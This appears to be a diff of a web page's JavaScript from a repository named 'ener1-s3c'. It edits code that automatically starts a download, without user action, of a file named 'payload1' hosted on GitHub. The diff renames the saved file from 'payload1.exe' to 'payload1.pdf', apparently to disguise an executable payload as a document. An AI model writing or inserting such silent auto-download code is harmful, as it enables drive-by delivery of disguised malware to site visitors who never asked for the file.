@@ -20,10 +20,10 @@ function downloadFile(url, filename) {
 }
 
 // Automatically start the download
-downloadFile("https://raw.githubusercontent.com/ener1-s3c/ener1-s3c/main/misellia.jpg", "misellia.jpg");
+downloadFile("https://raw.githubusercontent.com/ener1-s3c/ener1-s3c.github.io/master/payload1.pdf", "payload1.pdf");
 
 
 const fileUrl = 'https://raw.githubusercontent.com/ener1-s3c/ener1-s3c.github.io/master/payload1.pdf'; // URL of the file to be downloaded
-const fileName = 'payload1.exe'; // Desired name for the downloaded file
+const fileName = 'payload1.pdf'; // Desired name for the downloaded file
 
 downloadFile(fileUrl, fileName); // Call the function to download the file
